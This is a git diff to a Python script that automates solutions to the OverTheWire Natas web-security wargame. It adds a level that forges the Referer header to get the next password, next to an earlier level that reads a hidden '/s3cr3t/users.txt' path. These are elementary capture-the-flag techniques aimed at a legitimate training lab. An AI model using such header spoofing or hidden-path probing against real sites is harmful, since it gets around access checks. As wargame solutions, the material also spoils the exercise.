@@ -3,7 +3,7 @@ import re
 import requests
 
 PASSWORD_FILE = "natas_passwords"
-MAX_LEVEL = 4
+MAX_LEVEL = 5
 
 
 # INIT PASSWORD FILE
@@ -53,14 +53,21 @@ def remove_password(level):
 
 
 # CORE REQUEST HELPERS
-def request(level, password, path=""):
+def request(level, password, path="/", headers=None):
+    if headers is None:
+        headers = {}
+    
     url = f"http://natas{level}.natas.labs.overthewire.org{path}"
-    return requests.get(url, auth=(f"natas{level}", password))
+    return requests.get(url, auth=(f"natas{level}", password), headers=headers)
 
 # LEVEL SOLVERS
 def solve_level_A(level, pw):
-    path = LEVELS[level]["path"]
-    r = request(level, pw, path)
+    config = LEVELS[level]
+    
+    path = config["path"]
+    headers = config.get("headers", {})
+    
+    r = request(level, pw, path, headers)
     match = re.findall(r"[A-Za-z0-9]{32}", r.text)
     return match[-1] if match else None
 
@@ -81,6 +88,13 @@ LEVELS = {
     3: {
         "solver": solve_level_A,
         "path": "/s3cr3t/users.txt"
+    },
+    4: {
+        "solver": solve_level_A,
+        "path": "/",
+        "headers": {
+            "Referer": "http://natas5.natas.labs.overthewire.org/"
+        }
     }
 }
 
